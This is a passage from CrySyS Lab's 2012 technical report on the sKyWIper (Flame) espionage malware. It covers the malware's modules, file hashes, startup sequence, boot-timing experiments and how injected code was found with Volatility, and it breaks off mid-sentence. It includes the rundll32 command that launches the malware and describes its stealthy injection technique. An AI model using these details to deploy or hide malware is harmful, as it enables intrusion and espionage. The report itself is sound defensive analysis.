{
    "id": "a9343e1a-85b9-4d12-aed3-ead61a8f41fd",
    "created_at": "2022-10-25T16:48:11.143534Z",
    "updated_at": "2025-03-27T02:09:29.672681Z",
    "deleted_at": null,
    "sha1_hash": "6e4df95a65ad848c8192c7c76ed35d622764cab3",
    "title": "skywiper_v1.05",
    "authors": "CrySyS, BME",
    "file_creation_date": "2012-05-31T00:59:11Z",
    "file_modification_date": "2012-05-31T00:59:11Z",
    "file_size": 660827,
    "plain_text": "# sKyWIper (a.k.a. Flame a.k.a. Flamer): A complex malware for targeted attacks\n\n##### v1.05 (May 31, 2012) – It’s a live document modified all the time\n\n## Technical Report\n\n by\n\n#### Laboratory of Cryptography and System Security (CrySyS Lab)\n\n http://www.crysys.hu/\n\n Budapest University of Technology and Economics\n\n Department of Telecommunications\n\n http://www.bme.hu/\n\n##### This report contains information provided by anonymous parties and hence references were edited to preserve their anonymity\n\n Authors: sKyWIper Analysis Team \n\n\n-----\n\n## Findings in brief\n\nIn May 2012, our team participated in the analysis of an as yet unknown malware, which we\ninternally call sKyWIper. Based on the information initially received, we understood that the\nmalware is an important piece of a targeted attack. When we started the analysis, we did\nnot know how many countries were affected, but we suspected that it was not limited to a\nsingle country. Our suspicion was based on indications that pieces of the malware was\nprobably identified and uploaded from European parties onto binary analysis sites in the\npast. During the investigation, we received information about systems infected by sKyWIper\nin other countries, including Hungary, our home country. Hence, the suspicion became\nevidence, and this made it clear for us that our findings must be disclosed by publishing this\nreport.\n\nIt is obvious from the list of its files that sKyWIper must be identical to the malware\ndescribed in the post http://www.certcc.ir/index.php?name=news&file=article&sid=1894\n(from Iran National CERT (MAHER)) where it is called Flamer. For convenience, we keep our\nnaming of the malware and call it sKyWIper based on one of the filenames (~KWI) it uses for\ntemporary files.\n\nsKyWIper’s constitution is quite complex with a large number of components and the\nsubstantial size of some of its files. Therefore, providing its full analysis in a limited amount\nof time was infeasible with our current resources. Our goal was to get a quick understanding\nof the malware’s purpose, and to identify its main modules, storage formats, encryption\nalgorithms, injection mechanisms and activity in general. This report contains the results of\nour analysis, which should help other researchers with more resources to get started and\ncontinue the analysis producing more detailed results.\n\nOur first insight suggests that sKyWIper is another info-stealer malware with a modular\nstructure incorporating multiple propagation and attack techniques, but further analysis may\ndiscover components with other functionalities. In addition, sKyWIper may have been active\n**for as long as five to eight years, or even more. sKyWIper uses compression and encryption**\ntechniques to encode its files. More specifically, it uses 5 different encryption methods (and\nsome variants), 3 different compression techniques, and at least 5 different file formats (and\nsome proprietary formats too). It also uses special code injection techniques. Quite\ninterestingly, sKyWIper stores information that it gathers on infected systems in a highly\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 2\n\n\n-----\n\nstructured format in SQLite databases. Another uncommon feature of sKyWIper is the usage\nof the Lua scripting language.\n\nsKyWIper has very advanced functionality to steal information and to propagate. Multiple\nexploits and propagation methods can be freely configured by the attackers. Information\ngathering from a large network of infected computers was never crafted as carefully as in\nsKyWIper. The malware is most likely capable to use all of the computers’ functionalities for\nits goals. It covers all major possibilities to gather intelligence, including keyboard, screen,\nmicrophone, storage devices, network, wifi, Bluetooth, USB and system processes.\n\nThe results of our technical analysis support the hypotheses that sKyWIper was developed\nby a government agency of a nation state with significant budget and effort, and it may be\nrelated to cyber warfare activities.\n\nsKyWIper is certainly the most sophisticated malware we encountered during our practice;\narguably, it is the most complex malware ever found.\n\nMAJOR UPDATES:\n\n05/30/2012 Kaspersky published much more details about modules\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 3\n\n\n-----\n\n## Table of contents\n\n**1.** **Introduction .............................................................................................................................................5**\n_1.1._ _Investigation............................................................................................................................................................ 5_\n_1.2._ _History and build dates ...................................................................................................................................... 5_\n_1.3._ _Build dates................................................................................................................................................................ 6_\n_1.4._ _Comparison to Duqu (Stuxnet) at a glance............................................................................................... 7_\n\n**2.** **Main components...................................................................................................................................9**\n_2.1._ _Modules...................................................................................................................................................................... 9_\n_2.2._ _File listing and hashes.......................................................................................................................................11_\n\n**3.** **Activation and propagation............................................................................................................. 13**\n_3.1._ _Startup sequence.................................................................................................................................................13_\n_3.2._ _Bootup experiments to gather timing information.............................................................................15_\n_3.3._ _Injections.................................................................................................................................................................17_\n_3.4._ _Hooks ........................................................................................................................................................................20_\n_3.5._ _Mutexes....................................................................................................................................................................21_\n_3.6._ _nteps32 exports....................................................................................................................................................21_\n_3.7._ _Installation and propagation method.......................................................................................................22_\n\n**4.** **Description of components.............................................................................................................. 24**\n_4.1._ _Encryption algorithms......................................................................................................................................24_\n_4.2._ _Registry parts........................................................................................................................................................32_\n_4.3._ _Compression and table formats....................................................................................................................34_\n_4.4._ _Data storage formats........................................................................................................................................36_\n_4.5._ _Logging file list.....................................................................................................................................................38_\n_4.6._ _Saving additional information......................................................................................................................39_\n\n**5.** **C&C communication ........................................................................................................................... 41**\n\n**6.** **Attack details – dictionary and scripts ........................................................................................ 44**\n_6.1._ _Some interesting Lua scripts inside the code.........................................................................................48_\n_6.2._ _Related files............................................................................................................................................................51_\n_6.3._ _SQLite table structure of CLAN DB..............................................................................................................52_\n\n**7.** **Evasion techniques............................................................................................................................. 56**\n_7.1._ _Security programs relation............................................................................................................................56_\n_7.2._ _Design choices and tricks ................................................................................................................................56_\n_7.3._ _Malware’s own files list....................................................................................................................................57_\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 4\n\n\n-----\n\n## 1. Introduction\n\nOur team at CrySyS Lab, Budapest was alerted in May 2012 of a targeted attack found in the\nwild. Below we summarize the investigation history and the current status of the forensic\nanalysis.\n\n### 1.1. Investigation\n\nWe have carried out an investigation in collaboration with several parties involved in\nincident response since we were alerted of the malware sKyWIper. Some of these parties\ninvolved may want to remain anonymous; therefore, references in the document are\ndeliberately incorrect to avoid identification of the source of some information, data,\nsample, code, prototype, etc.\n\nsKyWIper is too complex to be fully analyzed with our limited resources and time. Therefore,\nour investigations focused on the “big picture”, trying to get a first insight into the\ncapabilities, behavior, encryption, data storage, propagation and communications of the\nmalware. Much more work is needed to fully understand the details of the operation of the\nmalware; however, as much debug/symbol information remains in the code, a detailed\nanalysis seems to be feasible with additional resources and time.\n\n### 1.2. History and build dates\n\nsKyWIper has most probably been operated undetected for years. It has been potentially\noperational for 5 years or more according to malware intelligence reports. The main\ncomponent, msgsecmgr.ocx a.k.a. **wavesup3.drv refers to many versions of a dynamic link**\nlibrary. This component has been previously observed (without raising an alarm) as follows:\n\n**_Country of origin_**\n\nThe filename WAVESUP3.DRV was first seen on Dec 5 2007 in Europe by the Webroot\ncommunity. Since, it has been observed in the following geographical regions:\n\n - Europe on Dec 5 2007\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 5\n\n\n-----\n\n - The United Arab Emirates on Apr 28 2008\n\n - Islamic Republic of Iran on Mar 1 2010\n\n**_File sizes_**\n\nThe following file sizes have been seen:\n\n - 1,153,536 bytes\n\n - 991,232 bytes\n\n - 975,872 bytes\n\n### 1.3. Build dates\n\nThe build date PE header information of the malware uses fake date information for its files;\nhence we cannot precisely identify the target system’s infection time. Nonetheless, the\nSQLite related part of mssecmgr.ocx contains some build time info (more about the\ncomponents later):\n```\n“Unidentified build, Aug 31 2011 23:15:32  31...........Aug 31 2011\n23:15:32”\n\n```\nThe following string shows SQLite version information, found in the memory dumps:\n```\n2010-01-05 15:30:36 28d0d7710761114a44a1a3a425a6883c661f06e7  NULL \n\n```\nIt relates to SQLITE_VERSION  \"3.6.22\"  (part of the source code)\n\nAlso, there is a reference “1.2.3”, and we think that this refers to zlib version number\npossibly used in SQLite tables.\n\nSome tables of the malware contain timestamps, possibly some of these do not relate to\nactual running times, but instead some dates when the attackers developed or constructed\nattack flows. An example is audcache.dat that contains timestamps like the ones below. We\nare not sure about the timestamps’ function and about the table structure. There are other\nbinary strings that might be timestamps, but their values vary too much to be accurate.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 6\n\n\n-----\n\n```\n5409 Tue Oct 11 23:35:34 2011\n5409 Tue Oct 11 23:35:37 2011\n5409 Tue Oct 11 23:35:37 2011\n5409 Tue Oct 11 23:35:37 2011\n…\nec02 Tue Oct 11 23:59:59 2011\nec02 Tue Oct 11 23:59:59 2011\nec02 Tue Oct 11 23:59:59 2011\nec02 Tue Oct 11 23:59:59 2011\nec02 Wed Oct 12 00:00:03 2011\n…\nec02 Wed Oct 12 10:52:33 2011\nec02 Wed Oct 12 10:52:33 2011\nec02 Wed Oct 12 10:53:04 2011\nec02 Wed Oct 12 11:09:32 2011\nec02 Wed Oct 12 11:09:32 2011\nec02 Wed Oct 12 11:21:17 2011\nec02 Wed Oct 12 11:21:17 2011\nec02 Wed Oct 12 11:21:17 2011\nec02 Wed Oct 12 11:21:17 2011\nec02 Wed Oct 12 11:22:04 2011\nec02 Wed Oct 12 11:22:04 2011\n\n```\n**Figure 1 – Timestamps found in audcache.dat**\n\n### 1.4. Comparison to Duqu (Stuxnet) at a glance\n\nAs our team played a significant role in the discovery and analysis of Duqu, another recently\ndiscovered info-stealer malware used in targeted attacks, we briefly compare sKyWIper to\nDuqu (and Stuxnet) in Table 1. Note that this is a high-level, simplified comparison.\n\nAs it can be seen from the comparison, sKyWIper and Duqu (Stuxnet) have many differences,\nand it seems plausible that sKyWIper was not made by the same developer team as that of\nDuqu/Stuxnet/~D. However, we cannot exclude the possibility that the attackers hired\nmultiple independent development teams for the same purpose, and sKyWIper and Duqu\nare two independent implementations developed for the same requirement specifications.\nThis may be an approach to increase the robustness of an operation, which can persist even\nif one of the two (or more?) implementations is uncovered.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 7\n\n\n-----\n\n�\nUPX compressed payload, some\n�\nCareful error handling ?\n�\nDeactivation timer Self-kill logic inside\nInitial Delay ? Some Different from Duqu\n�\nConfigurable starting in safe mode/dbg Not like Stuxnet\n**Table 1 – Comparing sKyWIper to Duqu and Stuxnet at a first glance**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 8\n\n|Feature|Duqu, Stuxnet, ~D|sKyWIper|Col4|\n|---|---|---|---|\n|Modular malware|\u0001|\u0001||\n|Kernel driver based rootkit|\u0001|fltmgr usage||\n|Valid digital signature on driver|Realtek, JMicron, C-media|Not found||\n|Injection based on A/V list|\u0001|Different||\n|Imports based on checksum|\u0001|Not seen||\n|3 Config files, all encrypted, etc.|\u0001|Totally diferrent||\n|Keylogger module|\u0001 (Duqu)|\u0001||\n|PLC functionality|\u0001 (Stuxnet)|Not found (yet)||\n|Infection through local shares|\u0001 (Stuxnet)|\u0001 Very likely||\n|Exploits|\u0001|\u0001 Some from Stuxnet!||\n|0-day exploits|\u0001|Not yet found||\n|DLL injection to system processes|\u0001|\u0001 (but different)||\n|DLL with modules as resources|\u0001|\u0001||\n|RPC communication|\u0001|?||\n|RPC control in LAN|\u0001|?||\n|RPC Based C&C|\u0001|?||\n|Port 80/443, TLS based C&C|\u0001|SSL+SSH found||\n|Special “magic” keys, e.g. 790522, AE|\u0001|Only 0xAE is similar||\n|Virtual file based access to modules|\u0001|Not seen||\n|Usage of LZO lib|Mod. LZO|No LZO: Zlib, PPMd, bzip2||\n|Visual C++ payload|\u0001|\u0001||\n|UPX compressed payload,|\u0001|some||\n|Careful error handling|\u0001|?||\n|Deactivation timer|\u0001|Self-kill logic inside||\n|Initial Delay|? Some|Different from Duqu||\n|Configurable starting in safe mode/dbg|\u0001|Not like Stuxnet||\n\n\n-----\n\n## 2. Main components\n\n### 2.1. Modules\n\nWe present an overview of the modules encountered during the analysis of sKyWIper.\nFigure 2 shows some files related to the malware, grouped by type, with some labels\nindicating our current knowledge about how some of these files are created and encoded\n(encrypted or compressed).\n\n**Figure 2 – Files related to the malware**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 9\n\n\n-----\n\nThe malware contains the following modules:\n\n**_Related OCX files:_**\n\n**mssecmgr.ocx (6 M)** **Main module**\n-- resource 146 (2.5 M) Compressed file with some zlib-like compression\nadvnetcfg.ocx (0.6 M) Injected part, possibly info stealer (screen shots and alike)\nmsglu32.ocx (1.6 M) Created by main module\nnteps32.ocx (0.8 M) Created by main module\nsoapr32.ocx (0.2 M) Can be found in resource 146, possibly network based propagation\nmodule\n\nThe main module of the malware is mssegmgr.ocx, which is 6 MByte long. It is loaded at\nstartup, and later copied to wavesup3.drv. The main module also creates other OCX modules\nas shown in the above list.\n\n**_Related files in the Windows/Temp folder:_**\n\nTo691.tmp (1.5 M) Initial settings data file\n\n**_Related files in the Windows/System32 folder:_**\n\nccalc32.sys Configuration settings table, fully encrypted. It is generated by the\nmalware installer process, and stored in uncompressed Resource\n146 of mssecmgr.sys at position 0x00001E7118. It is encrypted by\nRC4 (128).\nboot32drv.sys (~1 K) Desktop window related data, encrypted by XOR with 0xFF\n\n**_Temporary files created by the malware:_**\n\n~DEB93D.tmp Encrypted file containing SQLite database of nmb lookups. Written\nby services.exe.\n~HLV084.tmp Compressed parts contain info on running processes. Written by\nwinlogon.exe.\n~HLV294.tmp Purpose unknown. This and 4-5 similar files often appear on\ninfected systems.\n~KWI<> Compressed parts contain info on running processes. Written by\nwinlogon.exe.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 10\n\n\n-----\n\n~rf<number>.tmp Contains full file listing of the infected computer in SQLite 3\ndatabase format. Encrypted with algorithm E1 (see encryption\nalgorithms later).\n\n**_Related DAT files:_**\n\ndstrlog.dat CLAN DB for storing attack and propagation methods.\nlmcache.dat Information on target computer.\nmscrypt.dat Code, data, and configuration on attacks, e.g. JIMMY, MUNCH.\nntcache.dat Information on target computer.\nrccache.dat\nssitable\n\n**_DAT files created from dllrun32 startup (with file size and time of creation):_**\n\naudcache Possibly pre-created attack database (1572896 May XX 10:32)\naudfilter.dat (0 May XX 10:32)\ndstrlog.dat CLAN DB of attacks (86016 May XX 10:32)\nlmcache.dat Information on target computer (SFS) (460800 May XX 10:32)\nntcache.dat Information on target computer (SFS) (4454400 May XX 10:32)\nwpgfilter.dat (6163261 May XX 10:32)\n\n### 2.2. File listing and hashes\n\nHere, we provide the hashes for the main components of sKyWIper. Later in Section 7.3, we\nprovide a full list of suspected filenames used by the malware (whitelisted).\n```\nbb5441af1e1741fca600e9c433cb1550 *advnetcfg.ocx\nd53b39fb50841ff163f6e9cfd8b52c2e *msglu32.ocx\nbdc9e04388bda8527b398a8c34667e18 *mssecmgr.ocx\nc9e00c9d94d1a790d5923b050b0bd741 *nteps32.ocx\n296e04abb00ea5f18ba021c34e486746 *soapr32.ocx \n5ad73d2e4e33bb84155ee4b35fbefc2b *ccalc32.sys\ndcf8dab7e0fc7a3eaf6368e05b3505c5 *mscrypt.dat\n06a84ad28bbc9365eb9e08c697555154 *00004069.ex_\nec992e35e794947a17804451f2a8857e *00004784.dl_\n296e04abb00ea5f18ba021c34e486746 *00005729.dl_\nb604c68cd46f8839979da49bb2818c36 *00006411.dl_\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 11\n\n\n-----\n\n|c81d037b723adc43e3ee17b1eee9d6cc *boot32drv.sys (not constant but possible match)|Col2|\n|---|---|\n\n\n**Figure 3 – MD5 hashes of the malware’s components**\n```\n60d5dbddae21ecb4cfb601a2586dae776ca973ef *advnetcfg.ocx\n3a9ac7cd49e10a922abce365f88a6f894f7f1e9e *msglu32.ocx\na592d49ff32fe130591ecfde006ffa4fb34140d5 *mssecmgr.ocx\n7105b17d07fd5b30d5386862a3b9cc1ff53a2398 *nteps32.ocx\n5fdd7f613db43a5b0dbec8583d30ea7064983106 *soapr32.ocx\nfaaef4933e5f738e2abaff3089d36801dd871e89 *ccalc32.sys\n8b591dd7cd44d8abae7024ca2cc26034457dd50e *mscrypt.dat\n25fc20eedd7bfca26cf5fad1fade13b05c9a2d20 *00004069.ex_\ne608a6d9f0ab379e62119656e30eef12542f2263 *00004784.dl_\n5fdd7f613db43a5b0dbec8583d30ea7064983106 *00005729.dl_\n7a1351c084a556bdceaf221a43cb69579ca7b9bb *00006411.dl_\nd4b21620d68fdc44caa20362a417b251ff833761 *boot32drv.sys\n\n```\n**Figure 4 – SHA-1 hashes of the malware’s components**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 12\n\n\n-----\n\n## 3. Activation and propagation\n\n### 3.1. Startup sequence\n\nThe malware can be started using two different methods:\n\n1. Set msgsecmgr.ocx in the registry (see below at registry parts)\n\n2. Run the malware from rundll32 using the command as follows:\n```\n  start /wait rundll32.exe c:\\windows\\system32\\mssecmgr.ocx,DDEnumCallback\n\n```\nAt startup, mssecmgr.ocx is loaded as LSA Authentication Package. About 2 minutes later\nadvnetcfg.ocx is loaded by services.exe. It is repeated every 2 to 3 minutes 3 times in total.\nAbout 2 minutes later services.exe loads nteps32.ocx from mssecmgr.ocx, and then\nwinlogon.exe also loads nteps32.ocx. This file is loaded several times. In the meantime,\nexplorer.exe starts 5 iexplore processes that subsequently create wpgfilter.dat. Again 2\nminutes later ccalc32.sys is written by services.exe, and in 1 minute winlogon.exe loads it.\nNext, mssecmgr.ocx is copied to wavsup3.drv. Then, boot32drv.sys is loaded by services.exe.\nThis sequence of events is illustrated in Figure 5 below, while Figure 6 shows another\nrepresentation with exact timestamps.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 13\n\n\n-----\n\n**Figure 5 – Startup sequence**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 14\n\n\n-----\n\n**Figure 6 – Startup procedure with timestamps**\n\n### 3.2. Bootup experiments to gather timing information\n\nWe performed some experiment to determine the order of module loadings and activities.\n\n**Trial 1**\n\nccalc32.sys has a last change and last access time at the first start - difference ~50 seconds.\nIn normal LSA startup without mscrypt installed, ccalc was not created (no real CC traffic\neither).\n\nQuestion: Is ccalc32 created by mssecmgr+advnet+?? during startup if ran from rundll?\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 15\n\n\n-----\n\n**Trial 2**\n\nNteps, soapr, to691 are removed to test if these files are needed for the malware to start.\nWindows update traffic starts after 1:40 min of starting rundll for startup. At iexplore exit\nccalc32.sys immediately appeared. ~HLV files appear about 1:20 min after the appearance of\nccalc32.sys. The exact timestamp was 23:45:00 (local time), the sharp seconds value (:00)\nseems suspicious.\n\nResults: nteps, soapr, to691 are not needed for startup\n\n**Trial 4**\n\nStarting with Rundll32 at 23:49:20\n23:51:06 windowsupdate traffic begins\n23:52:48 iexplore quits, about 3 seconds later ccalc appears\n23:54:25 ~HVL files found in windows/temp\nmsglu32.ocx exists, creation time is 2004, change time is current local time\n\n**Trial 5**\n\nRemoving nteps, soapr, to691, msglu to be sure that msglu is indeed created during startup.\nResults: Malware is still running, msglu32 is created just at the same time as ~HLV files begin\nto be created. Order of events:\n\n1. iexplore + windowsupdate traffic\n2. traffic stops, ccalc32 created, some 1:20 min delay\n3. ~HLV files begin to appear and msglu is deployed\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 16\n\n\n-----\n\n### 3.3. Injections\n\nThere are multiple injections of code during startup. Only advnetcfg32 is probably injected 3\ntimes. We have no detailed information why code is injected into multiple processes\n(including winlogon.exe, services.exe, explorer.exe).\n```\n0 fltmgr.sys fltmgr.sys + 0x1888 0xf83f0888 C:\\WINDOWS\\System32\\Drivers\\fltmgr.sys\n1 fltmgr.sys fltmgr.sys + 0x31a7 0xf83f21a7 C:\\WINDOWS\\System32\\Drivers\\fltmgr.sys\n2 fltmgr.sys fltmgr.sys + 0xfc7a 0xf83fec7a C:\\WINDOWS\\System32\\Drivers\\fltmgr.sys\n3 ntkrnlpa.exe ntkrnlpa.exe + 0xac124 0x80583124 C:\\WINDOWS\\system32\\ntkrnlpa.exe\n4 ntkrnlpa.exe ntkrnlpa.exe + 0xe8488 0x805bf488 C:\\WINDOWS\\system32\\ntkrnlpa.exe\n5 ntkrnlpa.exe ntkrnlpa.exe + 0xe4a14 0x805bba14 C:\\WINDOWS\\system32\\ntkrnlpa.exe\n6 ntkrnlpa.exe ntkrnlpa.exe + 0x9ffeb 0x80576feb C:\\WINDOWS\\system32\\ntkrnlpa.exe\n7 ntkrnlpa.exe ntkrnlpa.exe + 0x6a67c 0x8054167c C:\\WINDOWS\\system32\\ntkrnlpa.exe\n8 <unknown> 0x1f2a333 0x1f2a333\n9 <unknown> 0x1f1ed9c 0x1f1ed9c\n10 <unknown> 0x1f1128b 0x1f1128b\n11 <unknown> 0x1f1c900 0x1f1c900\n\n```\n**Figure 7 – Winlogon.exe with injected code working with ccalc32.sys – procmon**\n\nIn case of Duqu, the authors used ZwCreateSection() and ZwMapViewOfSection() to copy\ncode into running processes, while other methods use LoadLibrary() and LoadLibraryEx() to\nload a library into a code. These techniques can easily be detected as the inserted DLLs\nappear in the PEB’s InLoadOrderModuleList. In case of sKyWIper, the code injection\nmechanism is stealthier such that the presence of the code injection cannot be determined\nby conventional methods such as listing the modules of the corresponding system processes\n(winlogon, services, explorer). The only trace we found at the first sight is that certain\nmemory regions are mapped with the suspicious READ, WRITE and EXECUTE protection\nflags, and they can only be grasped via the Virtual Address Descriptor (VAD) kernel data\nstructure. As these regions must have been allocated dynamically by means of\nVirtualAllocEx() or WriteProcessMemory(), they have the type of Vad Short. Thus, the\ncombination of RWE flags and type VadS for a given memory region in a system process\nallowed us to identify the code injection. Figure 8 shows the malicious code injections we\nfound with Volatility.\n```\nProcess: winlogon.exe Pid: 676 Address: 0xab0000\nVad Tag: VadS Protection: PAGE_EXECUTE_READWRITE\nFlags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6\n0x00ab0000 10 00 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc  ....J.o....<.Qr.\n0x00ab0000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 00  ...V............\n0x00ab0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n0x00ab0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 17\n\n\n-----\n\n|Col1|Col2|\n|---|---|\n|Process: winlogon.exe Pid: 676 Address: 0xac0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00ac0000 10 00 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc ....J.o....<.Qr. 0x00ac0000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 00 ...V............ 0x00ac0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x00ac0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ Process: winlogon.exe Pid: 676 Address: 0xb10000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00b10000 10 00 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc ....J.o....<.Qr. 0x00b10000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 00 ...V............ 0x00b10000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x00b10000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ Process: winlogon.exe Pid: 676 Address: 0xb20000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00b20000 10 00 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc ....J.o....<.Qr. 0x00b20000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 00 ...V............ 0x00b20000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x00b20000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ Process: winlogon.exe Pid: 676 Address: 0x10f0000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x010f0000 10 00 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc ....J.o....<.Qr. 0x010f0000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 00 ...V............ 0x010f0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x010f0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ Process: winlogon.exe Pid: 676 Address: 0x1220000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x01220000 10 00 00 00 4a 89 6f d1 aa 04 9b 3c c8 51 72 bc ....J.o....<.Qr. 0x01220000 1f c4 f1 56 00 00 00 00 00 00 00 00 00 00 00 00 ...V............ 0x01220000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x01220000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ Process: winlogon.exe Pid: 676 Address: 0x1490000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x01490000 ba ba 0d f0 00 00 48 01 30 25 80 7c b7 24 80 7c ......H.0%.|.$.| 0x01490000 b3 1d 90 7c 55 8b ec 51 53 56 57 33 ff 89 7d fc ...|U..QSVW3..}. 0x01490000 e8 00 00 00 00 58 89 45 fc 8b 45 fc 6a 64 59 48 .....X.E..E.jdYH 0x01490000 49 89 45 fc 74 5b 81 38 ba ba 0d f0 75 f1 8d 70 I.E.t[.8....u..p Process: winlogon.exe Pid: 676 Address: 0x3c8a0000||\n\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 18\n\n\n-----\n\n|Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE|Col2|\n|---|---|\n|Flags: CommitCharge: 4, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x3c8a0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3c8a0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3c8a0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x3c8a0000 00 00 00 00 27 00 27 00 01 00 00 00 00 00 00 00 ....'.'......... Process: services.exe Pid: 720 Address: 0x950000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x00950000 ba ba 0d f0 00 00 94 00 30 25 80 7c b7 24 80 7c ........0%.|.$.| 0x00950000 b3 1d 90 7c 55 8b ec 51 53 56 57 33 ff 89 7d fc ...|U..QSVW3..}. 0x00950000 e8 00 00 00 00 58 89 45 fc 8b 45 fc 6a 64 59 48 .....X.E..E.jdYH 0x00950000 49 89 45 fc 74 5b 81 38 ba ba 0d f0 75 f1 8d 70 I.E.t[.8....u..p Process: explorer.exe Pid: 1616 Address: 0x1400000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x01400000 ba ba 0d f0 00 00 e8 00 30 25 80 7c b7 24 80 7c ........0%.|.$.| 0x01400000 b3 1d 90 7c 55 8b ec 51 53 56 57 33 ff 89 7d fc ...|U..QSVW3..}. 0x01400000 e8 00 00 00 00 58 89 45 fc 8b 45 fc 6a 64 59 48 .....X.E..E.jdYH 0x01400000 49 89 45 fc 74 5b 81 38 ba ba 0d f0 75 f1 8d 70 I.E.t[.8....u..p Process: explorer.exe Pid: 1616 Address: 0x1b50000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x01b50000 67 32 cd ba 2e 00 4d 00 53 00 42 00 54 00 53 00 g2....M.S.B.T.S. 0x01b50000 00 00 43 02 50 03 f8 01 4b 6c 43 02 04 00 01 00 ..C.P...KlC..... 0x01b50000 03 00 00 00 90 fa fc 00 2c fb fc 00 00 00 da 00 ........,....... 0x01b50000 00 e9 90 7c 40 00 91 7c ff ff ff ff 3d 00 91 7c ...|@..|....=..| Process: explorer.exe Pid: 1616 Address: 0x4540000 Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6 0x04540000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x04540000 00 00 54 04 00 00 00 00 00 00 00 00 00 00 00 00 ..T............. 0x04540000 10 00 54 04 00 00 00 00 00 00 00 00 00 00 00 00 ..T............. 0x04540000 20 00 54 04 00 00 00 00 00 00 00 00 00 00 00 00 ..T.............||\n\n\n**Figure 8 – The presence of code injection and hooks (Volatility)**\n\nBy examining the injected regions in more details, we found that the inserted code belongs\nto shell32.dll. This can be verified by means of vmmap as shown in Figure 9.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 19\n\n\n-----\n\n**Figure 9 – The presence of code injection (vmmap)**\n\n### 3.4. Hooks\n\nBy checking an infected machine 